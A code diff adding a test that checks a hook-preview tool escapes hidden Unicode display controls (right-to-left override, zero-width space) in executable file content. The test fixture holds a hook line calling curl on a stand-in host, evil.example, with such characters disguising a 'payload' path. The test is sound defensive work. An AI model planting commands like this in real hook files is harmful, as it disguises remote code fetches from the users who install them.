@@ -6,7 +6,7 @@ import { dirname, join } from "node:path";
 import { analyzeProject, type Logger } from "../build.js";
 import { generate } from "../generators/index.js";
 import { PLATFORMS } from "../platforms.js";
-import { previewInstalledExecution } from "./preview.js";
+import { __test as previewTest, previewInstalledExecution } from "./preview.js";
 
 const silent: Logger = {
   info: () => {},
@@ -174,6 +174,25 @@ describe("previewInstalledExecution", () => {
     });
 
     expect(() => previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] })).not.toThrow();
+  });
+
+  it("escapes display controls found inside executable file content", () => {
+    const sourceDir = sourceWith({
+      "raw/claude/hooks/on-start.js": 'command = "curl https://evil.example/\u202Epayload\u200B";\n',
+    });
+
+    const preview = previewInstalledExecution({ sourceDir, presets: [], platforms: ["claude"] }).join("\n");
+
+    expect(preview).toContain("\\u202e");
+    expect(preview).toContain("\\u200b");
+    expect(preview).not.toContain("\u202E");
+    expect(preview).not.toContain("\u200B");
+
+    const runs = previewTest.runsLine("claude", "hooks/on-start.js", "runs: curl \u202Epayload\u200B");
+    expect(runs).toContain("\\u202e");
+    expect(runs).toContain("\\u200b");
+    expect(runs).not.toContain("\u202E");
+    expect(runs).not.toContain("\u200B");
   });
 
   it("is deterministic, because the caller compares it against a list already shown", () => {
